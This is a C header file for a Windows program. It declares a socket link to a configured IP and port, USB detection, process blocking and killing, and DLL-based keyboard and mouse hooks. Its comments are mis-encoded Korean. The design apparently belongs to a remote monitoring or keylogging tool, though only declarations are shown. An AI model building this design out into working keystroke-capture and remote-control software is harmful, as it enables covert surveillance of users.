#ifndef __MODULES_H__
#define __MODULES_H__


#include <windows.h>
#include <stdio.h>
#include <process.h>
#include <winreg.h>
#include <direct.h>
#include <tchar.h>
#include <locale.h>
#include <TlHelp32.h>

#define BUF_SIZE 256
#define FILE_BUF 1024

#define DEBUG

LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);
void RecvProc();
unsigned int WINAPI ConnectProc(void * lpParam);
unsigned int WINAPI USBDetector(void *lpParam);
unsigned int WINAPI ProcessBlocker(void *lpParam);
void CreateSocket();
int KillProcess(TCHAR* name);
void ReadAddr();


extern HINSTANCE g_hInst;
extern LPCTSTR lpszClass;
extern HWND hWndMain;
extern SOCKET hSocket;
extern SOCKADDR_IN hAddr;
extern HANDLE hFile;
extern HANDLE Con_pThread,USB_pThread;
extern DWORD dwResult;
extern BOOL isEof;
extern char ip[17];
extern char Port[6];


typedef BOOL(*HookProc)();

extern HINSTANCE KhinstDll;//�ε��� �ν��Ͻ������� dll���� Ű������
extern HINSTANCE MhinstDll;//���콺��

extern HookProc Kinstallhook;//Ű����
extern HookProc Kuninstallhook;

extern HookProc Minstallhook;//���콺
extern HookProc Muninstallhook;

#endif